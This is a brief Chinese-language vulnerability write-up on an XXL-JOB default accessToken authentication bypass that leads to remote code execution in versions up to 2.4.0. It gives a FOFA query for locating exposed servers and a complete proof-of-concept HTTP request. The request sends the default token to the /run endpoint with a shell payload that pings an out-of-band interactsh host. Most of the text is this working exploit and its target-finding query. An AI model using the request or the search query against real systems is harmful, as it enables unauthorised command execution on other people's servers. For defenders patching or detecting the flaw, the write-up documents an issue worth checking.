XXL-JOB默认accessToken身份绕过漏洞
## 0x01：漏洞描述

从XXL-JOB v2.3.1版本开始，在application.properties为 accessToken增加了默认值，如果用户没有修改该默认值，攻击者可利用该默认值在未授权的情况下绕过认证，最终可导致远程代码执行。

## 0x02：漏洞影响版本

XXL-JOB <= 2.4.0

## 0x03：网络空间测绘查询

fofa:
`"invalid request, HttpMethod not support" && port="9999"`
漏洞信息：https://github.com/projectdiscovery/nuclei-templates/issues/8523
## 0x04:poc
```
POST /run HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
        Content-Type: application/json
        Xxl-Job-Access-Token: default_token
        Content-Length: 396

        {
          "jobId": {{rand_int(1000)}},
          "executorHandler": "demoJobHandler",
          "executorParams": "demoJobHandler",
          "executorBlockStrategy": "COVER_EARLY",
          "executorTimeout": 0,
          "logId": 1,
          "logDateTime": 1586629003729,
          "glueType": "GLUE_SHELL",
          "glueSource": "ping {{interactsh-url}}",
          "glueUpdatetime": 1586699003758,
          "broadcastIndex": 0,
          "broadcastTotal": 0
        }
```
